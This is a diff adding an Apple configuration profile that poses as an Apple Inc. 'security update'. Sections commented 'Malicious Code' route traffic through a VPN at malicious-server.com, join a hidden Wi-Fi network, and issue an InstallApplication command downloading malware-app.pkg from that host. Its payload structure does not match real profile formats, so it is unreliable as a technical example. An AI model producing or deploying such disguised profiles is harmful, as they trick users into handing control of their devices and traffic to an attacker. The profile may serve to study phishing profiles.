@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+  <dict>
+    <key>PayloadContent</key>
+    <array>
+      <dict>
+        <key>PayloadType</key>
+        <string>com.apple.security</string>
+        <key>PayloadDisplayName</key>
+        <string>Apple-Secure</string>
+        <key>PayloadIdentifier</key>
+        <string>com.apple.secure-profile</string>
+        <key>PayloadDescription</key>
+        <string>Security update for Apple devices</string>
+        <key>PayloadVersion</key>
+        <integer>1</integer>
+
+        <!-- Malicious Code -->
+        <key>VPN</key>
+        <dict>
+          <key>PayloadType</key>
+          <string>com.apple.vpn.managed</string>
+          <key>UserDefinedName</key>
+          <string>Apple Secure VPN</string>
+          <key>VPNType</key>
+          <string>L2TP</string>
+          <key>RemoteAddress</key>
+          <string>malicious-server.com</string>
+        </dict>
+
+        <key>WiFi</key>
+        <dict>
+          <key>PayloadType</key>
+          <string>com.apple.wifi.managed</string>
+          <key>SSID_STR</key>
+          <string>AppleSecureNetwork</string>
+          <key>HIDDEN_NETWORK</key>
+          <true/>
+          <key>Password</key>
+          <string>malware123</string>
+        </dict>
+
+        <!-- Tracking & Command Execution -->
+        <key>Command</key>
+        <dict>
+          <key>PayloadType</key>
+          <string>com.apple.device.management</string>
+          <key>CommandUUID</key>
+          <string>malicious-command-uuid</string>
+          <key>Command</key>
+          <string>InstallApplication</string>
+          <key>URL</key>
+          <string>https://malicious-server.com/malware-app.pkg</string>
+        </dict>
+      </dict>
+    </array>
+    <key>PayloadUUID</key>
+    <string>malicious-uuid</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.secure</string>
+    <key>PayloadDescription</key>
+    <string>Apple Secure Configuration Profile</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Inc.</string>
+  </dict>
+</plist>
